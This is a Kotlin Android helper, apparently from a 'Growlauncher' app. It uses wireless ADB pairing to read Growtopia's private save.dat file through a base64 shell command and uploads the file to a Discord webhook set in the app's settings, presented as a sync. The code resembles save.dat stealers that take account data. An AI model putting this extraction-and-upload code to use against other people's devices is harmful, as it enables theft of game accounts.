package com.example.myapplication

import android.content.Context
import android.content.Intent
import android.net.nsd.NsdManager
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.widget.Toast
import com.flyfishxu.kadb.Kadb
import com.flyfishxu.kadb.cert.KadbCert
import com.flyfishxu.kadb.mdns.MdnsEndpoint
import com.flyfishxu.kadb.mdns.MdnsServiceType
import kotlinx.coroutines.runBlocking
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.concurrent.CompletableFuture
import java.util.concurrent.TimeUnit

object PairingHelper {
    private const val SAVE_FILE_PATH = "/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat"
    
    fun connectAndReadSaveFile(context: Context, pairingHost: String, pairingPort: Int, pairingCode: String): ByteArray? {
        val store = WirelessAdbIdentityStore(context)
        KadbCert.configure(store)

        // Start TLS_CONNECT discovery NOW, in parallel with the pairing handshake.
        // The _adb-tls-connect._tcp service is already running but mDNS may not
        // re-announce it to a newly-registered listener. Starting early maximises
        // the window: by the time Kadb.pair() returns the discovery has been
        // listening for ~2-3 s and is far more likely to have caught the record.
        val nsdManager = context.applicationContext.getSystemService(NsdManager::class.java)
        val connectFuture = CompletableFuture<MdnsEndpoint>()
        val connectDiscovery = SafeMdnsDiscovery(nsdManager).also { d ->
            d.start(listOf(MdnsServiceType.TLS_CONNECT.dnsType)) { endpoint ->
                connectFuture.complete(endpoint)
            }
        }

        return try {
            runBlocking { Kadb.pair(pairingHost, pairingPort, pairingCode) }
            // Short pause so Android can register the newly-authorized TLS cert
            // before we attempt the connect-phase handshake.
            Thread.sleep(500)

            // Give the discovery up to 20 s total from when it started; subtract
            // the time already elapsed during pairing (typically ~2 s).
            val endpoint = try {
                connectFuture.get(17_500, TimeUnit.MILLISECONDS)
            } catch (_: Exception) {
                Log.e("GrowlauncherPairing", "TLS_CONNECT discovery timed out for host=$pairingHost")
                null
            } ?: return null

            Kadb.create(endpoint.host, endpoint.port).use { kadb ->
                val response = kadb.shell("base64 $SAVE_FILE_PATH")
                if (response.exitCode == 0) {
                    PairingState.saveConnected(context, endpoint.host, endpoint.port)
                    Base64.decode(response.output.trim(), Base64.DEFAULT)
                } else {
                    Log.e("GrowlauncherPairing", "base64 shell failed: exit=${response.exitCode}")
                    null
                }
            }
        } catch (e: Throwable) {
            Log.e("GrowlauncherPairing", "connectAndReadSaveFile failed: host=$pairingHost port=$pairingPort", e)
            null
        } finally {
            connectDiscovery.stop()
        }
    }
    
    fun sendFileToDiscord(context: Context, fileData: ByteArray) {
        val prefs = context.getSharedPreferences("growlauncher_preferences", Context.MODE_PRIVATE)
        val webhookUrl = prefs.getString("discord_webhook_url", "")?.trim() ?: ""
        
        if (webhookUrl.isBlank()) {
            showToast(context, "Add your Discord webhook in Settings to sync save.dat")
            return
        }
        
        Thread {
            try {
                val payload = """{"content":"Growlauncher save.dat sync"}"""
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addPart(MultipartBody.Part.createFormData("payload_json", payload))
                    .addFormDataPart("file", "save.dat", fileData.toRequestBody("application/octet-stream".toMediaType()))
                    .build()
                val request = Request.Builder()
                    .url(webhookUrl)
                    .post(requestBody)
                    .build()
                OkHttpClient().newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        showToast(context, "save.dat uploaded to Discord")
                    } else {
                        showToast(context, "Failed to upload to Discord: ${response.code}")
                    }
                }
            } catch (e: IOException) {
                showToast(context, "Error uploading to Discord: ${e.message}")
            }
        }.start()
    }
    
    fun launchGame(context: Context) {
        val launchIntent = context.packageManager.getLaunchIntentForPackage("com.rtsoft.growtopia")
        if (launchIntent != null) {
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            context.startActivity(launchIntent)
            showToast(context, "Growtopia launched")
        } else {
            showToast(context, "Growtopia not installed")
        }
    }
    
    private fun showToast(context: Context, message: String) {
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(context, message, Toast.LENGTH_SHORT).show()
        }
    }
}
